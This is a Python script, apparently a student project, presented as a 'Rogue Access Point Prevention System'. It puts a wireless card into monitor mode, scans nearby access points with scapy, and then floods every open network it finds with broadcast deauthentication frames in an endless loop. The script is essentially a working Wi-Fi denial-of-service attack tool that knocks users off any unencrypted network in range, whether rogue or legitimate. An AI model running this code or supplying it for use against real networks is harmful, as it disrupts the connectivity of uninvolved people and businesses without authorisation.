#!/usr/bin/python3
import os
import sys
import signal
from time import sleep
from scapy.all import *
from multiprocessing import Process

wifi = {}
hacknic = ''
aps = {}
openwifis = {}

def sniffAP(p):
	if p.haslayer(Dot11Beacon) and p[Dot11].addr3 not in aps:
		ssid  = p[Dot11Elt].info.decode()
		bssid = p[Dot11].addr3
		stats = p[Dot11Beacon].network_stats()
		channel = stats.get("channel")
		enc = stats.get("crypto")
		if 'OPN' in enc:
			enc = 'N'
			if bssid not in openwifis:
				openwifis[bssid] = channel
		else :
			enc = 'Y'
		aps[p[Dot11].addr3] = enc
		print ("%02d  %s  %s %s" % (int(channel), enc, bssid, ssid))

def channel_hopper():
	while True:
		try:
			channel = random.randrange(1,12)
			os.system("iw dev %s set channel %d" % (hacknic, channel))
			time.sleep(1)
		except KeyboardInterrupt:
			break

if __name__ == "__main__":
	if not 'SUDO_UID' in os.environ.keys():
                print("Try running this program with sudo.")
                exit()
	print("\n\n" + "-" * 40 +"\nWelcome to Rogue Access Point Prevention System(RAPPS)!\nMade by:\n\n\tOsama Husam Younes Abu-Oshaibah (ID : 130181)")
	print("\tYaman Farouq Saeed Alhami (ID : 134734)\n")
	print("-" * 40 + "\n\n")
	print("Notes:- Make sure wireless NICs are in managed mode to avoid potential errors.")
	print("Loading ...")
	#sleep(10)
	print("Verifying available wireless network interface cards on your system ...")
	sleep(3)
	nmcli = subprocess.run(["nmcli","device","show"],capture_output=True, text=True).stdout
	wifinics = re.findall(r'GENERAL.DEVICE:                         .*\nGENERAL.TYPE:                           wifi\n',nmcli)
	for i in range(len(wifinics)):
		wifinics[i]=wifinics[i][40:wifinics[i].find('\n')]
	print("The following WiFi interfaces are available:")
	if len(wifinics) == 0:
		print("There are no available WiFi interfaces .\nplease make sure you have a wireless interface that is in managed mode.")
		exit(0)
	for index, item in enumerate(wifinics):
		print(f"\t{index} - {item}")
	while True:
		wifi_interface_choice = input("\nPlease select the index of the interface you want to use for the attack: ")
		try:
			if wifinics[int(wifi_interface_choice)]:
				break
		except:
			print("Invalid index!")

	hacknic = wifinics[int(wifi_interface_choice)]
	sleep(3)
	print("\nNow let's kill conflicting processes:\n")
	kill_confilict_processes = subprocess.run(["sudo", "airmon-ng", "check", "kill"])
	sleep(3)
	print("\nAll conflicting processes have been terminated!")
	sleep(3)
	print("Putting wifi adapter into monitored mode:\n")
	sleep(3)
	os.system(f'sudo airmon-ng start {hacknic}')
	sleep(3)
	print(f"\nWifi adapter is now in monitor mode and it's name has been changed to : {hacknic}mon")
	sleep(3)
	hacknic = hacknic + "mon"
	print("\nscanning wifi networks (press 'ctrl + c' to stop scanning and proceed )...\n")
	print ("CH ENC BSSID             SSID")
	print ("-----------------------------")
	p = Process(target = channel_hopper)
	p.start()
	try :
       		sniff(iface=hacknic,prn=sniffAP)
	except KeyboardInterrupt:
		p.stop()
	print ("\n==========  REPORT  ============")
	print ("Total APs found: %d" % len(aps))
	print ("Encrypted APs  : %d" % len([ap for ap in aps if aps[ap] =='Y']))
	print ("Unencrypted APs: %d" % len([ap for ap in aps if aps[ap] =='N']))
	print ("================================\n")
	sleep(3)
	if len(openwifis) == 0:
		print("No rogue access points have been detected.\n")
	else:
		print("All rogue access points will be attacked shortly.\n")
	print("Thank you for using Rogue Access Point Prevention System (RAPPS).\n")
	if len(openwifis) == 0:
		exit(0)
	print("note:'ctrl+c' might not work to terminate this program , consider using 'ctrl + z' if so.")
	print("Regards .... \n")
	sleep(6)
	while True:
		for bssid in openwifis:
			mac = bssid
			Channel = openwifis[bssid]
			os.system("iw dev %s set channel %d" % (hacknic,Channel))
			pkt = RadioTap() / Dot11( addr1 = "ff:ff:ff:ff:ff:ff", addr2 = mac , addr3 = mac)/Dot11Deauth()
			sendp(pkt ,iface= hacknic ,count = 100 ,inter = 0.005)
